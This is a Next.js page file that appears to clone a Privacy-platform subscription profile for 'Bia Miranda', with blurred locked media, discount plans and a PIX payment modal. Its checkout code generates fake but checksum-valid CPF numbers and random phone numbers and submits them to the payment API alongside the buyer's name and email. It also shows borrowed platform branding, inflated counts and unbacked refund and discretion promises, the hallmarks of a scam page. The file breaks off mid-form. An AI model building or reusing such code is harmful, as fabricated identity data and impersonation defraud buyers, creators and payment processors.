"use client"
// Bia Miranda Privacy Page
import { useEffect, useRef, useState } from 'react'
import Image from 'next/image'

export default function PrivacyPage() {
  const [bioExpanded, setBioExpanded] = useState(false)
  const [promotionsOpen, setPromotionsOpen] = useState(true)
  const [showPixModal, setShowPixModal] = useState(false)
  const [pixModalState, setPixModalState] = useState<'form' | 'loading' | 'pix' | 'success' | 'error'>('form')
  const [pixPlanLabel, setPixPlanLabel] = useState('')
  const [pixAmount, setPixAmount] = useState(0)
  const [pixCode, setPixCode] = useState('')
  const [pixQrUrl, setPixQrUrl] = useState('')
  const [pixIdentifier, setPixIdentifier] = useState('')
  const [pixTimer, setPixTimer] = useState('15:00')
  const [pixError, setPixError] = useState('')
  const [formNome, setFormNome] = useState('')
  const [formEmail, setFormEmail] = useState('')
  const [formNomeErr, setFormNomeErr] = useState('')
  const [formEmailErr, setFormEmailErr] = useState('')
  
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const pollRef = useRef<NodeJS.Timeout | null>(null)

  // Gera CPF válido
  const gerarCpfValido = () => {
    const n = Array.from({ length: 9 }, () => Math.floor(Math.random() * 9))
    let s1 = 0
    for (let i = 0; i < 9; i++) s1 += n[i] * (10 - i)
    let d1 = (s1 * 10) % 11
    if (d1 === 10 || d1 === 11) d1 = 0
    let s2 = 0
    for (let i = 0; i < 9; i++) s2 += n[i] * (11 - i)
    s2 += d1 * 2
    let d2 = (s2 * 10) % 11
    if (d2 === 10 || d2 === 11) d2 = 0
    return n.concat([d1, d2]).join('')
  }

  const gerarDadosAleatorios = () => {
    const nomes = ["Ana Lima", "Carlos Souza", "Mariana Costa", "Pedro Alves", "Fernanda Silva", "Rafael Gomes"]
    const emails = ["mail", "inbox", "msg", "acesso", "conta"]
    const domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br"]
    
    return {
      cpf: gerarCpfValido(),
      phone: '119' + Math.floor(Math.random() * 90000000 + 10000000)
    }
  }

  const abrirPixDireto = (planLabel: string, amount: number) => {
    setPixPlanLabel(planLabel)
    setPixAmount(amount)
    setFormNome('')
    setFormEmail('')
    setFormNomeErr('')
    setFormEmailErr('')
    setPixModalState('form')
    setShowPixModal(true)
  }

  const fecharPixModal = () => {
    setShowPixModal(false)
    if (timerRef.current) clearInterval(timerRef.current)
    if (pollRef.current) clearInterval(pollRef.current)
  }

  const confirmarDadosEGerarPix = async () => {
    let ok = true
    setFormNomeErr('')
    setFormEmailErr('')

    if (!formNome || formNome.length < 3 || formNome.length > 100) {
      setFormNomeErr('Informe seu nome completo.')
      ok = false
    }

    const emailRe = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
    if (!formEmail || !emailRe.test(formEmail) || formEmail.length > 255) {
      setFormEmailErr('Informe um e-mail válido.')
      ok = false
    }

    if (!ok) return

    setPixModalState('loading')

    const dados = gerarDadosAleatorios()

    try {
      // Chama a API do SyncPay
      const response = await fetch('/api/pix', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: formNome,
          email: formEmail,
          cpf: dados.cpf,
          phone: dados.phone,
          amount: pixAmount,
          plan: pixPlanLabel
        })
      })

      const data = await response.json()

      if (!response.ok) {
        throw new Error(data.error || 'Erro ao gerar PIX')
      }

      const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.pix_code)}`

      setPixCode(data.pix_code)
      setPixQrUrl(qrUrl)
      setPixIdentifier(data.identifier)
      setPixModalState('pix')
      iniciarTimer(15 * 60)
    } catch (err: unknown) {
      const errorMessage = err instanceof Error ? err.message : 'Erro ao gerar PIX'
      setPixError(errorMessage)
      setPixModalState('error')
    }
  }

  const iniciarTimer = (segundos: number) => {
    let rem = segundos
    timerRef.current = setInterval(() => {
      rem--
      const m = Math.floor(rem / 60)
      const s = rem % 60
      setPixTimer(`${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`)
      if (rem <= 0 && timerRef.current) clearInterval(timerRef.current)
    }, 1000)
  }

  const copiarPix = async () => {
    try {
      await navigator.clipboard.writeText(pixCode)
      alert('Código PIX copiado!')
    } catch {
      const ta = document.createElement('textarea')
      ta.value = pixCode
      document.body.appendChild(ta)
      ta.select()
      document.execCommand('copy')
      document.body.removeChild(ta)
      alert('Código PIX copiado!')
    }
  }

  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
      if (pollRef.current) clearInterval(pollRef.current)
    }
  }, [])

  return (
    <>
      <style jsx global>{`
        * {
          margin: 0;
          padding: 0;
          box-sizing: border-box;
        }

        body {
          font-family: 'Montserrat', sans-serif;
          background-color: #f5f5f5;
        }

        .nav-container {
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 16px 24px;
          max-width: 1200px;
          margin: 0 auto;
          height: 56px;
          background-color: #f7f5f3;
          position: relative;
          border-bottom: 1px solid #e5e5e5;
        }

        .logo {
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .logo-text {
          font-size: 22px;
          font-weight: 500;
          color: #1f2937;
          letter-spacing: -0.5px;
        }

        .globe-icon {
          position: absolute;
          right: 24px;
          top: 50%;
          transform: translateY(-50%);
          color: #6b7280;
          cursor: pointer;
        }

        .main-container {
          max-width: 580px;
          margin: 24px auto;
          padding: 0 16px;
        }

        .profile-card {
          background: #ffffff;
          border-radius: 20px;
          overflow: hidden;
          box-shadow: 0 4px 24px rgba(0, 0, 0, 0.06);
        }

        .cover-section {
          position: relative;
        }

        .cover-image {
          position: relative;
          width: 100%;
          height: 140px;
          overflow: hidden;
          border-radius: 20px 20px 0 0;
        }

        .cover-image img {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .profile-info {
          display: flex;
          align-items: flex-start;
          gap: 12px;
          margin-top: -40px;
          padding: 0 20px;
          position: relative;
          z-index: 10;
        }

        .profile-text {
          flex: 1;
        }

        .profile-header-row {
          display: flex;
          align-items: flex-start;
          justify-content: space-between;
          padding-top: 46px;
        }

        .stats {
          display: flex;
          gap: 10px;
          color: #6b7280;
          font-size: 12px;
          font-weight: 400;
          flex-shrink: 0;
        }

        .stats span {
          display: flex;
          align-items: center;
          gap: 3px;
        }

        .stats .stat-icon {
          opacity: 0.6;
        }

        .profile-image {
          width: 80px;
          height: 80px;
          border-radius: 50%;
          border: 3px solid #ffffff;
          overflow: hidden;
          background: white;
          flex-shrink: 0;
          box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .profile-image img {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .profile-name {
          font-size: 17px;
          font-weight: 700;
          color: #111827;
          display: flex;
          align-items: center;
          gap: 4px;
        }

        .verified svg {
          width: 18px;
          height: 18px;
        }

        .profile-username {
          color: #111827;
          font-size: 13px;
        }

        .profile-bio {
          padding: 16px 20px;
        }

        .bio-container {
          margin-bottom: 12px;
        }

        .bio-text {
          font-size: 13px;
          color: #374151;
          line-height: 1.6;
          white-space: pre-line;
          overflow: hidden;
        }

        .bio-text.collapsed {
          max-height: 60px;
        }

        .bio-toggle {
          background: none;
          border: none;
          color: #f97316;
          font-weight: 500;
          cursor: pointer;
          font-size: 13px;
          margin-top: 6px;
          display: inline-block;
          margin-bottom: 12px;
        }

        .social-icons {
          display: flex;
          gap: 12px;
          margin-bottom: 20px;
        }

        .social-icon {
          width: 32px;
          height: 32px;
          display: flex;
          align-items: center;
          justify-content: center;
          color: #374151;
          border: 1px solid #e5e7eb;
          border-radius: 8px;
          cursor: pointer;
          transition: all 0.2s;
        }

        .social-icon:hover {
          background: #f3f4f6;
        }

        /* Pricing panel - New Design */
        .pricing-panel {
          padding: 0;
          background: transparent;
          border-radius: 0;
          box-shadow: none;
        }

        .pricing-section-title {
          font-size: 14px;
          font-weight: 500;
          color: #111827;
          margin: 0 0 10px 0;
        }

        .plan-card {
          width: 100%;
          display: flex;
          align-items: center;
          justify-content: space-between;
          background: linear-gradient(90deg, #f8a68a 0%, #fcd5c5 50%, #fff5f0 100%);
          border: none;
          border-radius: 999px;
          padding: 16px 24px;
          margin-bottom: 8px;
          cursor: pointer;
          transition: transform 0.15s ease, box-shadow 0.2s ease;
          text-decoration: none;
        }

        .plan-card:hover {
          transform: translateY(-2px);
          box-shadow: 0 6px 20px rgba(248, 166, 138, 0.35);
        }

        .plan-card:active {
          transform: translateY(0);
        }

        .plan-card .plan-title {
          font-size: 15px;
          font-weight: 600;
          color: #1f2937;
          letter-spacing: 0.2px;
        }

        .plan-card .plan-price {
          font-size: 15px;
          font-weight: 700;
          color: #1f2937;
        }

        .promotions {
          margin-top: 1.5rem;
        }

        .promotions-header {
          display: flex;
          align-items: center;
          justify-content: space-between;
          margin-bottom: 0.5rem;
          cursor: pointer;
        }

        .promotions-header h4 {
          font-size: 14px;
          font-weight: 500;
          color: #111827;
        }

        .chevron {
          color: #9ca3af;
          transition: transform 0.3s ease;
          display: flex;
          align-items: center;
        }

        /* Content toggle */
        .content-toggle {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          margin: 20px 0;
          flex-wrap: wrap;
        }

        .toggle-btn {
          background: none;
          border: none;
          color: #6b7280;
          font-size: 14px;
          font-weight: 500;
          cursor: pointer;
          padding: 8px 16px;
          border-radius: 20px;
          transition: all 0.2s;
        }

        .toggle-btn.active {
          background: #ff6b3d;
          color: white;
        }

        .toggle-btn.disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }

        .toggle-btn .count {
          font-weight: 700;
        }

        .separator {
          color: #d1d5db;
        }

        /* Feed gallery */
        .feed-gallery {
          max-width: 560px;
          margin: 18px auto 0;
          padding: 0 6px;
        }

        .feed-grid {
          display: grid;
          grid-template-columns: 1fr;
          gap: 12px;
        }

        .feed-card {
          background: #fff;
          border: 1px solid #e5e7eb;
          border-radius: 12px;
          overflow: hidden;
          box-shadow: 0 1px 2px rgba(16, 24, 40, 0.04);
        }

        .feed-header {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 10px;
        }

        .feed-avatar {
          width: 28px;
          height: 28px;
          border-radius: 999px;
          object-fit: cover;
          flex: 0 0 auto;
        }

        .feed-head-text {
          display: flex;
          flex-direction: column;
          line-height: 1.1;
          flex: 1 1 auto;
          min-width: 0;
        }

        .feed-name {
          font-weight: 700;
          color: #111827;
          font-size: 13px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }

        .feed-handle {
          color: #6b7280;
          font-size: 12px;
          white-space: nowrap;
          overflow: hidden;
          text-overflow: ellipsis;
        }

        .feed-media {
          position: relative;
          width: 100%;
          aspect-ratio: 9/16;
          background: #f3f4f6;
        }

        .feed-media .locked-media {
          width: 100%;
          height: 100%;
          object-fit: cover;
          filter: blur(8px);
        }

        .lock-bubble {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 68px;
          height: 68px;
          border-radius: 999px;
          background: rgba(255, 255, 255, 0.92);
          display: grid;
          place-items: center;
          box-shadow: 0 6px 16px rgba(0, 0, 0, 0.12);
          color: #9ca3af;
          font-size: 22px;
        }

        .privacy-watermark {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 120px;
          height: auto;
          opacity: 0.6;
          pointer-events: none;
        }

        .stats-pill {
          position: absolute;
          bottom: 10px;
          left: 10px;
          display: inline-flex;
          align-items: center;
          gap: 12px;
          background: rgba(17, 24, 39, 0.65);
          color: #fff;
          padding: 8px 12px;
          border-radius: 999px;
          font-size: 12px;
          font-weight: 700;
        }

        .stats-pill i {
          margin-right: 6px;
        }

        .feed-footer {
          display: flex;
          align-items: center;
          justify-content: space-around;
          padding: 10px;
          color: #6b7280;
        }

        .feed-footer i {
          font-size: 16px;
        }

        /* FAQ */
        .info-container {
          max-width: 640px;
          margin: 20px auto;
          padding: 0 16px;
        }

        .faq-container {
          background: white;
          border-radius: 12px;
          padding: 20px;
          box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }

        .faq-titulo {
          font-size: 18px;
          font-weight: 700;
          color: #111827;
          margin-bottom: 16px;
        }

        .faq-item {
          border-bottom: 1px solid #e5e7eb;
          padding: 12px 0;
        }

        .faq-item:last-child {
          border-bottom: none;
        }

        .faq-question {
          width: 100%;
          background: none;
          border: none;
          text-align: left;
          font-size: 14px;
          font-weight: 600;
          color: #374151;
          cursor: pointer;
          display: flex;
          align-items: center;
          gap: 8px;
          padding: 4px 0;
        }

        .faq-icon::before {
          content: "+";
          display: inline-block;
          width: 20px;
          height: 20px;
          background: #ff6b3d;
          color: white;
          border-radius: 50%;
          text-align: center;
          line-height: 20px;
          font-weight: 700;
          font-size: 14px;
        }

        .faq-item.active .faq-icon::before {
          content: "-";
        }

        .faq-answer {
          display: none;
          padding: 12px 0 4px 28px;
          font-size: 14px;
          color: #6b7280;
          line-height: 1.5;
        }

        .faq-item.active .faq-answer {
          display: block;
        }

        /* Footer CTA */
        .footer-cta {
          max-width: 380px;
          margin: 28px auto 16px;
          padding: 0 16px;
        }

        .footer-legal-links {
          text-align: center;
          font-size: 12px;
          color: #9ca3af;
          padding: 16px;
        }

        .footer-legal-links a {
          color: #6b7280;
          text-decoration: none;
        }

        .footer-legal-links .separator {
          margin: 0 8px;
        }

        /* PIX Modal */
        .pix-modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.82);
          z-index: 99999;
          padding: 16px;
          box-sizing: border-box;
          overflow-y: auto;
          display: flex;
          align-items: flex-start;
          justify-content: center;
        }

        .pix-modal-container {
          background: #fff;
          border-radius: 20px;
          max-width: 420px;
          width: 100%;
          margin: 20px 0;
          overflow: hidden;
          font-family: 'Montserrat', sans-serif;
          position: relative;
        }

        .pix-modal-header {
          background: linear-gradient(90deg, #f8a68a 0%, #fcd5c5 50%, #fff5f0 100%);
          padding: 18px 20px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          border-radius: 16px 16px 0 0;
        }

        .pix-modal-header-text {
          color: #1f2937;
          font-size: 13px;
          font-weight: 600;
          opacity: 0.9;
        }

        .pix-modal-plan-label {
          color: #1f2937;
          font-size: 20px;
          font-weight: 800;
          margin-top: 2px;
        }

        .pix-modal-close {
          background: rgba(255, 255, 255, 0.5);
          border: none;
          color: #1f2937;
          width: 36px;
          height: 36px;
          border-radius: 50%;
          font-size: 18px;
          cursor: pointer;
          display: flex;
          align-items: center;
          justify-content: center;
        }

        .pix-modal-form {
          padding: 24px 20px;
        }

        .pix-form-label {
          display: block;
          font-size: 12px;
          font-weight: 700;
          color: #374151;
          margin-bottom: 6px;
          text-transform: uppercase;
          letter-spacing: 0.5px;
        }

        .pix-form-input {
          width: 100%;
          box-sizing: border-box;
          border: 1.5px solid #e5e7eb;
          border-radius: 10px;
          padding: 12px 14px;
          font-size: 15px;
          font-family: 'Montserrat', sans-serif;
          outline: none;
          transition: border-color 0.2s;
        }

        .pix-form-input:focus {
          border-color: #f8a68a;
        }

        .pix-form-error {
          color: #b91c1c;
          font-size: 12px;
          margin-top: 4px;
        }

        .pix-submit-btn {
          width: 100%;
          background: linear-gradient(90deg, #f8a68a 0%, #fcd5c5 50%, #fff5f0 100%);
          color: #1f2937;
          border: none;
          border-radius: 999px;
          padding: 15px;
          font-size: 16px;
          font-weight: 700;
          cursor: pointer;
          font-family: 'Montserrat', sans-serif;
          letter-spacing: 0.3px;
        }

        .pix-loading {
          padding: 40px 20px;
          text-align: center;
        }

        .pix-spinner {
          width: 44px;
          height: 44px;
          border: 4px solid #fcd5c5;
          border-top-color: #f8a68a;
          border-radius: 50%;
          animation: spinPix 0.8s linear infinite;
          margin: 0 auto 16px;
        }

        @keyframes spinPix {
          to { transform: rotate(360deg); }
        }

        @keyframes blinkPix {
          0%, 100% { opacity: 1; }
          50% { opacity: 0.3; }
        }

        .pix-content {
          padding: 20px;
        }

        .pix-qr-container {
          display: flex;
          justify-content: center;
          margin-bottom: 14px;
        }

        .pix-qr-img {
          width: 200px;
          height: 200px;
          border-radius: 12px;
          border: 1px solid #e5e7eb;
        }

        .pix-code-container {
          background: #f3f4f6;
          border-radius: 10px;
          padding: 12px;
          display: flex;
          align-items: center;
          gap: 8px;
          margin-bottom: 14px;
        }

        .pix-code-text {
          flex: 1;
          font-size: 11px;
          color: #374151;
          word-break: break-all;
          font-family: monospace;
        }

        .pix-copy-btn {
          background: #ff6b3d;
          color: #fff;
          border: none;
          border-radius: 8px;
          padding: 8px 14px;
          font-size: 13px;
          font-weight: 700;
          cursor: pointer;
          font-family: 'Montserrat', sans-serif;
          white-space: nowrap;
          flex-shrink: 0;
        }

        .pix-status {
          display: flex;
          align-items: center;
          gap: 8px;
          font-size: 14px;
          font-weight: 600;
          color: #6b7280;
          padding: 10px 16px;
          background: #f3f4f6;
          border-radius: 10px;
          margin-bottom: 10px;
        }

        .pix-status-dot {
          width: 10px;
          height: 10px;
          border-radius: 50%;
          background: #ff6b3d;
          animation: blinkPix 1.2s infinite;
          flex-shrink: 0;
        }

        .pix-success {
          padding: 32px 20px;
          text-align: center;
        }

        .pix-success-icon {
          font-size: 56px;
          margin-bottom: 14px;
        }

        .pix-success-title {
          font-size: 22px;
          font-weight: 800;
          color: #047857;
          margin-bottom: 8px;
        }

        .pix-success-text {
          font-size: 14px;
          color: #065f46;
          margin-bottom: 20px;
        }

        .pix-error {
          padding: 32px 20px;
          text-align: center;
        }

        .pix-error-icon {
          font-size: 48px;
          margin-bottom: 14px;
        }

        .pix-error-text {
          font-size: 15px;
          color: #b91c1c;
          font-weight: 600;
          margin-bottom: 20px;
        }

        /* Popup Overlay */
        .popup-overlay {
          display: none;
          position: fixed;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: rgba(0, 0, 0, 0.8);
          z-index: 9999;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        .popup-overlay.active {
          display: flex;
        }

        /* Media Queries */
        @media (max-width: 768px) {
          .nav-container {
            height: 60px;
            padding: 10px 15px;
          }

          .logo {
            width: 140px;
            height: 56px;
          }

          .search-container,
          .nav-icons {
            display: none;
          }
        }

        @media (max-width: 600px) {
          .top-bar-content {
            gap: 10px;
            justify-content: center;
            padding: 0 10px;
          }

          .top-bar-content > img {
            display: none;
          }

          .privacy-logo {
            font-size: 12px;
            padding: 6px 14px;
            background: rgba(255, 255, 255, 0.14);
          }
        }

        @media (max-width: 380px) {
          .trust-inline {
            font-size: 11px;
            gap: 6px;
          }

          .plan-outline {
            padding: 10px 12px;
          }

          .plan-outline .left {
            gap: 6px;
          }

          .mini-badge {
            font-size: 11px;
            padding: 2px 6px;
          }
        }
      `}</style>

      <header>
        <nav className="navbar">
          <div className="nav-container">
            <div className="logo">
              <Image src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/logo-black-x9vfF42uSamWBvcXtkHvdmGRD53EqX.svg" width={86} height={18} alt="Privacy Logo" unoptimized />
            </div>
            <div className="globe-icon">
              <Image src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/globe-gAiK6gs7MagVRsgKpFhB5lAbv596ed.svg" width={22} height={22} alt="Globe" unoptimized />
            </div>
          </div>
        </nav>
      </header>

      <main>
        <div className="main-container">
          <div className="profile-card">
            <div className="cover-section">
              <div className="cover-image">
                <Image src="/images/cover.jpg" width={640} height={350} alt="Imagem de capa" style={{ width: '100%', height: '100%', objectFit: 'cover', objectPosition: 'center 75%' }} unoptimized />
              </div>

              <div className="profile-info">
                <div className="profile-image">
                  <Image src="/images/profile.jpg" width={250} height={250} alt="Foto de perfil" style={{ width: '100%', height: '100%', objectFit: 'cover' }} unoptimized />
                </div>
                <div className="profile-text">
                  <div className="profile-header-row">
                    <div>
                      <div className="profile-name">
                        Bia Miranda
                        <span className="verified">
                          <svg aria-label="Verificado" fill="#f97316" height="16" role="img" viewBox="0 0 40 40" width="16" xmlns="http://www.w3.org/2000/svg">
                            <title>Verificado</title>
                            <path d="M19.998 3.094 14.638 0l-2.972 5.15H5.432v6.354L0 14.64 3.094 20 0 25.359l5.432 3.137v5.905h5.975L14.638 40l5.36-3.094L25.358 40l3.232-5.6h6.162v-6.01L40 25.359 36.905 20 40 14.641l-5.248-3.03v-6.46h-6.419L25.358 0l-5.36 3.094Zm7.415 11.225 2.254 2.287-11.43 11.5-6.835-6.93 2.244-2.258 4.587 4.581 9.18-9.18Z" fillRule="evenodd"></path>
                          </svg>
                        </span>
                      </div>
                      <div className="profile-username">@Biamirandapessoal</div>
                    </div>
                    <div className="stats">
                      <span><svg className="stat-icon" xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="18" height="18" x="3" y="3" rx="2" ry="2"/><circle cx="9" cy="9" r="2"/><path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"/></svg> 81</span>
                      <span><svg className="stat-icon" xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect width="20" height="20" x="2" y="2" rx="2"/><path d="m10 8 6 4-6 4V8z"/></svg> 20</span>
                      <span><svg className="stat-icon" xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg> 36</span>
                      <span><svg className="stat-icon" xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z"/></svg> 13.3K</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="profile-bio">
              <div className="bio-container">
                <p className={`bio-text ${!bioExpanded ? 'collapsed' : ''}`}>
                  {`A pimenta que você não consegue parar de provar… 🌶️
Conteúdos exclusivos, sem censura e sem limites 😈
Se você chegou até aqui, já sabe o que quer… só falta clicar 👇`}
                </p>
                <button className="bio-toggle" onClick={() => setBioExpanded(!bioExpanded)}>
                  {bioExpanded ? 'Mostrar menos' : 'Ler mais'}
                </button>
              </div>

              <div className="social-icons">
                <a href="https://instagram.com" target="_blank" rel="noopener noreferrer" className="social-icon">
                  <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect width="20" height="20" x="2" y="2" rx="5" ry="5"/>
                    <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
                    <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
                  </svg>
                </a>
              </div>

              {/* Pricing Panel */}
              <div className="pricing-panel">
                <p className="pricing-section-title">Assinaturas</p>
                
                <button className="plan-card" onClick={() => abrirPixDireto('15 Dias', 14.90)}>
                  <span className="plan-title">15 Dias</span>
                  <span className="plan-price">R$ 14,90</span>
                </button>

                <div className="promotions">
                  <div className="promotions-header" onClick={() => setPromotionsOpen(!promotionsOpen)}>
                    <h4>Promoções</h4>
                    <span className="chevron" style={{ transform: promotionsOpen ? 'rotate(180deg)' : 'rotate(0deg)' }}>
                      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                        <polyline points="6 9 12 15 18 9"/>
                      </svg>
                    </span>
                  </div>

                  {promotionsOpen && (
                    <>
                      <button className="plan-card" onClick={() => abrirPixDireto('30 Dias', 24.90)}>
                        <span className="plan-title">30 Dias (40% off)</span>
                        <span className="plan-price">R$ 24,90</span>
                      </button>

                      <button className="plan-card" onClick={() => abrirPixDireto('90 Dias', 42.90)}>
                        <span className="plan-title">90 Dias (50% off)</span>
                        <span className="plan-price">R$ 42,90</span>
                      </button>

                      <button className="plan-card" onClick={() => abrirPixDireto('180 Dias', 59.90)}>
                        <span className="plan-title">180 Dias (60% off)</span>
                        <span className="plan-price">R$ 59,90</span>
                      </button>
                    </>
                  )}
                </div>
              </div>
            </div>
          </div>

          <div className="content-toggle">
            <button className="toggle-btn disabled" disabled>
              <span className="count">502</span> Posts
            </button>
            <span className="separator">•</span>
            <button className="toggle-btn active">
              <span className="count">148</span> Videos
            </button>
            <span className="separator">•</span>
            <button className="toggle-btn">
              <span className="count">354</span> Fotos
            </button>
          </div>

          {/* Feed Gallery */}
          <section className="feed-gallery">
            <div className="feed-grid">
              {/* Video 1 */}
              <article className="feed-card">
                <header className="feed-header">
                  <Image className="feed-avatar" src="/images/profile.jpg" width={28} height={28} alt="Avatar" unoptimized />
                  <div className="feed-head-text">
                    <div className="feed-name">Bia Miranda</div>
                    <div className="feed-handle">@Biamirandapessoal</div>
                  </div>
                </header>
                <div className="feed-media">
                  <video 
                    className="locked-media" 
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/yURvKUye_720p-cSRLGMvym4G5IozY89vqmulPhxzlyu.mp4"
                    autoPlay
                    loop
                    muted
                    playsInline
                    style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', objectFit: 'cover', filter: 'blur(8px)' }} 
                  />
                  <div className="lock-bubble">🔒</div>
                  <div className="stats-pill">
                    <span>156K</span>
                    <span>28K</span>
                  </div>
                </div>
                <footer className="feed-footer">
                  <span>🤍</span>
                  <span>💬</span>
                  <span>🔖</span>
                </footer>
              </article>

              {/* Video 2 */}
              <article className="feed-card">
                <header className="feed-header">
                  <Image className="feed-avatar" src="/images/profile.jpg" width={28} height={28} alt="Avatar" unoptimized />
                  <div className="feed-head-text">
                    <div className="feed-name">Bia Miranda</div>
                    <div className="feed-handle">@Biamirandapessoal</div>
                  </div>
                </header>
                <div className="feed-media">
                  <video 
                    className="locked-media" 
                    src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Video%202026-04-17%20at%2011.03.25-EXg70Z0UiQ7wTuJws7JoeO8EzP5BDN.mp4" 
                    autoPlay 
                    loop 
                    muted
                    playsInline
                    style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', objectFit: 'cover', filter: 'blur(8px)' }} 
                  />
                  <div className="lock-bubble">🔒</div>
                  <div className="stats-pill">
                    <span>198K</span>
                    <span>35K</span>
                  </div>
                </div>
                <footer className="feed-footer">
                  <span>🤍</span>
                  <span>💬</span>
                  <span>🔖</span>
                </footer>
              </article>

              {/* Imagem */}
              <article className="feed-card">
                <header className="feed-header">
                  <Image className="feed-avatar" src="/images/profile.jpg" width={28} height={28} alt="Avatar" unoptimized />
                  <div className="feed-head-text">
                    <div className="feed-name">Bia Miranda</div>
                    <div className="feed-handle">@Biamirandapessoal</div>
                  </div>
                </header>
                <div className="feed-media">
                  <Image className="locked-media" src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/WhatsApp%20Image%202026-04-17%20at%2001.21.15-kMkjPBx9nInnc0eSj0N6X2Q2EcJ3Jt.jpeg" width={400} height={711} alt="Previa" style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', objectFit: 'cover', filter: 'blur(8px)' }} unoptimized />
                  <div className="lock-bubble">🔒</div>
                  <div className="stats-pill">
                    <span>245K</span>
                    <span>42K</span>
                  </div>
                </div>
                <footer className="feed-footer">
                  <span>🤍</span>
                  <span>💬</span>
                  <span>🔖</span>
                </footer>
              </article>
            </div>
          </section>
        </div>

        {/* FAQ */}
        <div className="info-container">
          <div className="faq-container">
            <h2 className="faq-titulo">Perguntas Frequentes</h2>
            <div className="faq-list">
              {[
                { q: 'É sigiloso? Vai aparecer na fatura?', a: 'Sim, é sigiloso. Cobrança discreta, sem nomes chamativos. Seus dados ficam criptografados.' },
                { q: 'Quando tenho acesso depois do pagamento?', a: 'Imediato. Pagamento aprovado = liberação em até 10s e e-mail contendo o login de acesso.' },
                { q: 'Posso cancelar quando quiser? A assinatura renova?', a: 'Sim. Você pode cancelar a renovação automática pela área do assinante a qualquer momento.' },
                { q: 'Tem reembolso?', a: 'Sim. Reembolso de 7 dias sem burocracia. Se não curtir, devolvemos 100%.' },
                { q: 'Como funciona a "Chat telegram"?', a: 'Basta mandar uma mensagem no chat do produtor e combinar.' },
                { q: 'Posso pedir conteúdo personalizado?', a: 'Sim! Solicitações podem ser feitas no chat do produtor, com o conteúdo desejado.' },
              ].map((item, idx) => (
                <FaqItem key={idx} question={item.q} answer={item.a} />
              ))}
            </div>
          </div>
        </div>

        <div className="footer-cta">
          <button className="plan-card" onClick={() => abrirPixDireto('15 Dias', 14.90)}>
            <span className="plan-title">Veja tudo por apenas</span>
            <span className="plan-price">R$ 14,90</span>
          </button>
        </div>

        <p className="footer-legal-links">
          <a href="#">Termos de Uso</a>
          <span className="separator">•</span>
          <a href="#">Política de Privacidade</a>
        </p>
      </main>

      {/* PIX Modal */}
      {showPixModal && (
        <div className="pix-modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) fecharPixModal() }}>
          <div className="pix-modal-container">
            <div className="pix-modal-header">
              <div>
                <div className="pix-modal-header-text">Pagamento via Pix</div>
                <div className="pix-modal-plan-label">{pixPlanLabel} – R$ {pixAmount.toFixed(2).replace('.', ',')}</div>
              </div>
              <button className="pix-modal-close" onClick={fecharPixModal}>✕</button>
            </div>

            {pixModalState === 'form' && (
              <div className="pix-modal-form">
                <p style={{ fontSize: '14px', color: '#6b7280', textAlign: 'center', marginBottom: '20px', lineHeight: 1.5 }}>
                  Confirme seus dados para gerar o PIX 🔒
                </p>
                <div style={{ marginBottom: '14px' }}>
                  <label className="pix-form-label">Nome completo</label>
                  <input
                    className="pix-form-input"
